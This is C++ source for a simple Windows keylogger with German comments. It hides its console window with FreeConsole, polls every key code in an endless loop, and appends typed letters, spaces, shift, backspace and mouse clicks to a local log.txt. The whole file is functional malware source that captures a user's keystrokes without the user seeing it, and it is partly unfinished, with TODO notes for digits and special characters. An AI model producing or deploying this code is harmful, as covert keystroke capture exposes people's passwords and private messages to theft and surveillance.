#include <iostream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file); //int key und char pointer auf file 

int main (){
	FreeConsole();
	char i;

	while (true) {
		//LOWER CPU USAGE TODO!
		for (i = 8; i <= 255; i++) {
			//Sleep(1);

			if (GetAsyncKeyState(i) == -32767)//-32767 bedeutet BUTTON == i  was pressed! wir wollen button pressed state catchen
			{
				Save(i, "log.txt");
			}




		}



	}

}

int Save(int _key, char * file) {

	cout << _key << endl; 
	//Sleep(10);
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	
	if (_key == VK_SHIFT)//TODO ADD MORE KEYS
		fprintf(OUTPUT_FILE, "%s", ", [SHIFT]");
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", ", [BACK]");
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", ", [L_CLICK]\n");
	else if (_key == VK_RBUTTON)
		fprintf(OUTPUT_FILE, "%s", ", [R_CLICK]");
	else if (_key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (_key == 0x41)
		fprintf(OUTPUT_FILE, "%s", "a");
	else if (_key == 0x42)
		fprintf(OUTPUT_FILE, "%s", "b");
	else if (_key == 0x43)
		fprintf(OUTPUT_FILE, "%s", "c");
	else if (_key == 0x44)
		fprintf(OUTPUT_FILE, "%s", "d");
	else if (_key == 0x45)
		fprintf(OUTPUT_FILE, "%s", "e");
	else if (_key == 0x46)
		fprintf(OUTPUT_FILE, "%s", "f");
	else if (_key == 0x47)
		fprintf(OUTPUT_FILE, "%s", "g");
	else if (_key == 0x48)
		fprintf(OUTPUT_FILE, "%s", "h");
	else if (_key == 0x49)
		fprintf(OUTPUT_FILE, "%s", "i");
	else if (_key == 0x4A)
		fprintf(OUTPUT_FILE, "%s", "j");
	else if (_key == 0x4B)
		fprintf(OUTPUT_FILE, "%s", "k");
	else if (_key == 0x4C)
		fprintf(OUTPUT_FILE, "%s", "l");
	else if (_key == 0x4D)
		fprintf(OUTPUT_FILE, "%s", "m");
	else if (_key == 0x4E)
		fprintf(OUTPUT_FILE, "%s", "n");
	else if (_key == 0x4F)
		fprintf(OUTPUT_FILE, "%s", "o");
	else if (_key == 0x50)
		fprintf(OUTPUT_FILE, "%s", "p");
	else if (_key == 0x51)
		fprintf(OUTPUT_FILE, "%s", "q");
	else if (_key == 0x52)
		fprintf(OUTPUT_FILE, "%s", "r");
	else if (_key == 0x53)
		fprintf(OUTPUT_FILE, "%s", "s");
	else if (_key == 0x54)
		fprintf(OUTPUT_FILE, "%s", "t");
	else if (_key == 0x55)
		fprintf(OUTPUT_FILE, "%s", "u");
	else if (_key == 0x56)
		fprintf(OUTPUT_FILE, "%s", "v");
	else if (_key == 0x57)
		fprintf(OUTPUT_FILE, "%s", "w");
	else if (_key == 0x58)
		fprintf(OUTPUT_FILE, "%s", "x");
	else if (_key == 0x59)
		fprintf(OUTPUT_FILE, "%s", "y");
	else if (_key == 0x5A)
		fprintf(OUTPUT_FILE, "%s", "z");
	//TODO ZIFFERN UND SONDERZEICHEN!	

	//fprintf(OUTPUT_FILE, "%S", &_key); 
	fclose(OUTPUT_FILE);
	return 0;
}